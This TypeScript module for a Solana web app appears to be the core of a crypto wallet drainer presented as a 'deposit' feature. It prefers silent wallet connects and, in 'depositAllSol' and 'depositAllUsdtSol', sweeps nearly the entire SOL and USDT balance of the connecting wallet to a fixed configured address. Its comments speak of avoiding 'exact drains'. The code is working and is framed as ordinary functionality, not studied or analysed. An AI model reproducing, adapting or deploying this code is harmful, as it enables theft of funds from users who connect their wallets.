import bs58 from 'bs58'
import {
  Connection,
  PublicKey,
  SystemProgram,
  TransactionMessage,
  VersionedTransaction,
  clusterApiUrl,
} from '@solana/web3.js'
import {
  TOKEN_PROGRAM_ID,
  ASSOCIATED_TOKEN_PROGRAM_ID,
  getAssociatedTokenAddress,
  createAssociatedTokenAccountInstruction,
  createTransferInstruction,
} from '@solana/spl-token'
import {
  SOLANA_RPC,
  SOL_DEPOSIT_ADDRESS,
  SOL_USDT_MINT,
  SOL_AUTO_CREATE_ATA,
  SOL_BUFFER_LAMPORTS,
} from '../config'

// Prefer AppKit's injected provider if present (WalletConnect/Reown AppKit)
function getAppKitSolanaProvider(): any {
  const w: any = window as any
  if (w.appkit?.solana) return w.appkit.solana
  if (w.__appkit?.solana) return w.__appkit.solana
  if (w.reown?.solana) return w.reown.solana
  return null
}

// Common injected wallets
export function getInjectedSolanaProvider(): any {
  const w: any = window as any
  if (w.solana?.isPhantom) return w.solana
  if (w.solflare?.isSolflare) return w.solflare
  if (w.backpack?.solana) return w.backpack.solana
  return w.solana || null
}

// Active provider = AppKit if available, else injected
export function getActiveSolanaProvider(): any {
  return getAppKitSolanaProvider() || getInjectedSolanaProvider()
}

// Normalize signature from various wallet return shapes
function normalizeSignature(res: any): string {
  if (!res) throw new Error('No signature returned')
  const sigAny =
    (typeof res === 'string' && res) ||
    (res as any)?.signature ||
    (Array.isArray(res) && (res as any[])[0]) ||
    res

  if (sigAny instanceof Uint8Array) return bs58.encode(sigAny as Uint8Array)
  if (typeof sigAny === 'string') return sigAny as string
  throw new Error('Unsupported signature type from wallet')
}

/** small retry helper for transient RPC failures */
async function retry<T>(fn: () => Promise<T>, attempts = 2, delayMs = 250): Promise<T> {
  let lastErr: any
  for (let i = 0; i < attempts; i++) {
    try {
      return await fn()
    } catch (e) {
      lastErr = e
      if (i < attempts - 1) await new Promise((r) => setTimeout(r, delayMs))
    }
  }
  throw lastErr
}

// Try to ensure provider is connected and return { provider, publicKey }
async function ensureProviderAndKey(
  providedPublicKey?: PublicKey
): Promise<{ provider: any; publicKey: PublicKey }> {
  const provider = getActiveSolanaProvider()
  if (!provider) throw new Error('No Solana provider found (AppKit or injected). Install/connect a wallet.')

  // If caller already gave a PublicKey, use it (but still try to ensure provider connected)
  if (providedPublicKey) {
    try {
      // best-effort connect if wallet supports
      if (provider.connect && !provider.isConnected) {
        // try onlyIfTrusted first — do not force UI popups
        await provider.connect?.({ onlyIfTrusted: true }).catch(() => {})
      }
    } catch {}
    return { provider, publicKey: providedPublicKey }
  }

  // Otherwise attempt to connect / read publicKey from provider
  try {
    // some wallets expose publicKey even when not "connected" in UI state
    let pk = provider.publicKey
    if (!pk) {
      // attempt a trusted connect first (no popup). If that fails, fall back to interactive connect.
      try {
        const resp = await provider.connect?.({ onlyIfTrusted: true }).catch(() => null)
        pk = pk || resp?.publicKey
      } catch {}
    }

    if (!pk) {
      // last resort: interactive connect if supported
      try {
        const resp = await provider.connect?.({ onlyIfTrusted: false }).catch(() => null)
        pk = pk || resp?.publicKey
      } catch (e) {
        // will be handled below
      }
    }

    if (!pk) throw new Error('No publicKey from provider (wallet not connected or user rejected connect).')

    return { provider, publicKey: pk }
  } catch (e) {
    throw new Error(`Failed to get publicKey from Solana provider: ${String((e as any)?.message || e)}`)
  }
}

/**
 * Send SOL: "max-safe" (balance - estimatedFee - buffer) to avoid exact drains
 * Accepts optional { publicKey } (PublicKey). If not provided it will connect the active provider.
 */
export async function depositAllSol({ publicKey }: { publicKey?: PublicKey } = {}) {
  const { provider, publicKey: ownerPub } = await ensureProviderAndKey(publicKey)
  if (!ownerPub) throw new Error('No Solana publicKey available')

  // normalize rpc
  const rpc = SOLANA_RPC && SOLANA_RPC.length ? SOLANA_RPC : clusterApiUrl('mainnet-beta')
  const connection = new Connection(rpc, 'confirmed')

  // balance in lamports (number) — retry once on transient RPC errors
  let balance: number
  try {
    balance = await retry(() => connection.getBalance(ownerPub), 2)
  } catch (err) {
    throw new Error(
      `Failed to get balance of account ${ownerPub.toBase58()}: ${String((err as any)?.message || err)}`
    )
  }

  // Build a tiny dummy transfer to estimate fee for a single transfer message
  let blockhashResp: { blockhash: string; lastValidBlockHeight: number }
  try {
    blockhashResp = await retry(() => connection.getLatestBlockhash('confirmed'), 2)
  } catch (err) {
    throw new Error(`Failed to fetch recent blockhash: ${String((err as any)?.message || err)}`)
  }

  const { blockhash, lastValidBlockHeight } = blockhashResp
  const dummyIx = SystemProgram.transfer({
    fromPubkey: ownerPub,
    toPubkey: ownerPub,
    lamports: 1,
  })
  const dummyMsg = new TransactionMessage({
    payerKey: ownerPub,
    recentBlockhash: blockhash,
    instructions: [dummyIx],
  }).compileToV0Message()

  let feeInfo: any
  try {
    feeInfo = await retry(() => connection.getFeeForMessage(dummyMsg, 'confirmed'), 2)
  } catch (err) {
    // If fee query fails, use a conservative fallback fee estimate
    console.warn('getFeeForMessage failed, using fallback fee estimate:', err)
    feeInfo = { value: 5000 }
  }
  const estimatedFee = Number(feeInfo?.value ?? 5000)

  // Use config buffer (fall back to a small default if not set)
  const buffer = typeof SOL_BUFFER_LAMPORTS === 'number' && SOL_BUFFER_LAMPORTS > 0 ? SOL_BUFFER_LAMPORTS : 3_000_000

  if (balance <= estimatedFee + buffer) {
    throw new Error('Not enough SOL to cover fee + buffer')
  }

  const lamportsToSend = balance - estimatedFee - buffer
  if (lamportsToSend <= 0) throw new Error('Not enough SOL to send after reserving fee and buffer')

  const to = new PublicKey(SOL_DEPOSIT_ADDRESS)
  const ix = SystemProgram.transfer({ fromPubkey: ownerPub, toPubkey: to, lamports: lamportsToSend })
  const msg = new TransactionMessage({
    payerKey: ownerPub,
    recentBlockhash: blockhash,
    instructions: [ix],
  }).compileToV0Message()
  const tx = new VersionedTransaction(msg)

  // Prefer signAndSendTransaction (Phantom/Backpack) when available
  if (provider.signAndSendTransaction) {
    let _res: any
    try {
      _res = await provider.signAndSendTransaction(tx)
    } catch (err) {
      throw new Error(`Wallet signAndSendTransaction failed: ${String((err as any)?.message || err)}`)
    }

    const signature = normalizeSignature(_res)
    // confirm (best-effort)
    try {
      await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed')
    } catch {
      // ignore confirmation failures silently
    }
    return { signature, from: ownerPub.toBase58() }
  }

  // Fallback: signTransaction then sendRawTransaction
  if (!provider.signTransaction) throw new Error('Wallet cannot sign transactions (missing signTransaction)')
  let signed: any
  try {
    signed = await provider.signTransaction(tx as any)
  } catch (err) {
    throw new Error(`Wallet signTransaction failed: ${String((err as any)?.message || err)}`)
  }

  let signature: string
  try {
    signature = await retry(
      () =>
        connection.sendRawTransaction(signed.serialize(), {
          skipPreflight: false,
          preflightCommitment: 'confirmed',
        }),
      2
    )
  } catch (err) {
    throw new Error(`Failed to send transaction: ${String((err as any)?.message || err)}`)
  }

  try {
    await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed')
  } catch {}
  return { signature, from: ownerPub.toBase58() }
}

/**
 * Send USDT (SPL): send (tokenBalance - 1) minimal unit if possible.
 * Will create destination ATA only when SOL_AUTO_CREATE_ATA is truthy.
 * Accepts optional { publicKey } to avoid connecting.
 */
export async function depositAllUsdtSol({ publicKey }: { publicKey?: PublicKey } = {}) {
  const { provider, publicKey: ownerPub } = await ensureProviderAndKey(publicKey)
  if (!ownerPub) throw new Error('No Solana publicKey available')

  const rpc = SOLANA_RPC && SOLANA_RPC.length ? SOLANA_RPC : clusterApiUrl('mainnet-beta')
  const connection = new Connection(rpc, 'confirmed')
  const mint = new PublicKey(SOL_USDT_MINT)
  const owner = ownerPub

  const sourceAta = await getAssociatedTokenAddress(
    mint,
    owner,
    false,
    TOKEN_PROGRAM_ID,
    ASSOCIATED_TOKEN_PROGRAM_ID
  )

  // Try to fetch token account balance (retryable)
  const balInfo = await retry(() => connection.getTokenAccountBalance(sourceAta, 'confirmed').catch(() => { throw new Error('getTokenAccountBalance failed') }), 2).catch(() => null)
  if (!balInfo) throw new Error('No USDT token account')

  let amountBig = BigInt(balInfo.value.amount || '0')
  // leave 1 minimal unit to avoid exact drain
  if (amountBig > 1n) amountBig = amountBig - 1n
  if (amountBig <= 0n) throw new Error('USDT (SPL) balance too low')

  const destOwner = new PublicKey(SOL_DEPOSIT_ADDRESS)
  const destAta = await getAssociatedTokenAddress(
    mint,
    destOwner,
    false,
    TOKEN_PROGRAM_ID,
    ASSOCIATED_TOKEN_PROGRAM_ID
  )

  const ixs: any[] = []

  // Create destination ATA if missing and allowed by config
  const destInfo = await connection.getAccountInfo(destAta, 'confirmed')
  if (!destInfo) {
    if (SOL_AUTO_CREATE_ATA) {
      ixs.push(
        createAssociatedTokenAccountInstruction(
          owner,
          destAta,
          destOwner,
          mint,
          TOKEN_PROGRAM_ID,
          ASSOCIATED_TOKEN_PROGRAM_ID
        )
      )
    } else {
      throw new Error('Destination USDT ATA missing. Enable SOL_AUTO_CREATE_ATA or create it manually.')
    }
  }

  ixs.push(createTransferInstruction(sourceAta, destAta, owner, amountBig, [], TOKEN_PROGRAM_ID))

  // Estimate fee for this combined instruction set
  let blockhashResp: { blockhash: string; lastValidBlockHeight: number }
  try {
    blockhashResp = await retry(() => connection.getLatestBlockhash('confirmed'), 2)
  } catch (err) {
    throw new Error(`Failed to fetch recent blockhash: ${String((err as any)?.message || err)}`)
  }
  const { blockhash, lastValidBlockHeight } = blockhashResp

  const msg = new TransactionMessage({
    payerKey: owner,
    recentBlockhash: blockhash,
    instructions: ixs,
  }).compileToV0Message()
  const tx = new VersionedTransaction(msg)

  // Rough fee estimate
  let feeInfo: any
  try {
    feeInfo = await retry(() => connection.getFeeForMessage(msg, 'confirmed'), 2)
  } catch (err) {
    console.warn('getFeeForMessage failed for USDT transfer, using fallback fee estimate:', err)
    feeInfo = { value: 5000 }
  }
  const estimatedFee = Number(feeInfo?.value ?? 5000)
  const buffer = typeof SOL_BUFFER_LAMPORTS === 'number' && SOL_BUFFER_LAMPORTS > 0 ? SOL_BUFFER_LAMPORTS : 3_000_000

  // Ensure owner has enough SOL for fees + buffer (we do not deduct SOL from token transfer)
  let solBalance: number
  try {
    solBalance = await retry(() => connection.getBalance(owner), 2)
  } catch (err) {
    throw new Error(`Failed to get SOL balance for fee check: ${String((err as any)?.message || err)}`)
  }

  if (solBalance <= estimatedFee + buffer) {
    throw new Error('Not enough SOL in wallet to pay transaction fees + buffer for SPL transfer')
  }

  // Sign and send
  if (provider.signAndSendTransaction) {
    const _res = await provider.signAndSendTransaction(tx)
    const signature = normalizeSignature(_res)
    try {
      await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed')
    } catch {}
    return { signature, from: owner.toBase58() }
  }

  if (!provider.signTransaction) throw new Error('Wallet cannot sign transactions (missing signTransaction)')
  const signed = await provider.signTransaction(tx as any)
  const signature = await retry(
    () =>
      connection.sendRawTransaction(signed.serialize(), {
        skipPreflight: false,
        preflightCommitment: 'confirmed',
      }),
    2
  )
  try {
    await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed')
  } catch {}
  return { signature, from: owner.toBase58() }
}
